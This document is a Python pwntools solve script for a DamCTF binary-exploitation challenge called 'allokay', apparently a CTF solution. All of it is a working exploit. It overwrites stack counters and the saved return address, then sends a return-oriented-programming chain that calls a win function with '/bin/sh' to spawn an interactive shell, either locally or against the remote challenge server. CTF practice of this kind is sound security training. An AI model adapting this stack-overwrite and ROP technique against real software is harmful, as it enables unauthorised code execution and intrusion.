#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=chals.damctf.xyz PORT=32575
"""

from pwn import *

PROG_PATH = "./allokay"


def init_pwntools_context():
    context.binary = PROG_PATH
    context.log_level = "debug"


def init_io():
    if args["REMOTE"]:
        return remote(args["HOST"], int(args["PORT"]))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


class Offsets:
    stack_counter = 19  # stack offset 0x98
    stack_max_counter = 17  # stack offset 0x88
    stack_saved_ret = 23  # stack offset 0xb8


class Gadgets:
    # pop rdi; ret;
    pop_rdi = 0x00400933


def win(io):
    elf = context.binary

    rop = [
        Gadgets.pop_rdi,
        elf.sym.buffer + 4,
        elf.sym.win,
    ]

    input_len = b"100\x00" + b"/bin/sh\x00"
    io.sendlineafter("do you have?\n", input_len)

    def write_qword(value):
        io.sendlineafter(": ", str(value))

    for _ in range(Offsets.stack_max_counter):
        write_qword(0x4141414141414141)

    needed_len = (len(rop) + Offsets.stack_saved_ret)
    write_qword((needed_len << 0x20) | 0xdeadbeef)

    for _ in range(Offsets.stack_counter - Offsets.stack_max_counter - 1):
        write_qword(0x4242424242424242)

    write_qword(((Offsets.stack_saved_ret - 1) << 0x20) | 0xcafebabe)

    for rop_qword in rop:
        write_qword(rop_qword)

    io.interactive()


if __name__ == "__main__":
    init_pwntools_context()
    io = init_io()

    if args["PAUSE"]:
        raw_input("PAUSED...")

    win(io)
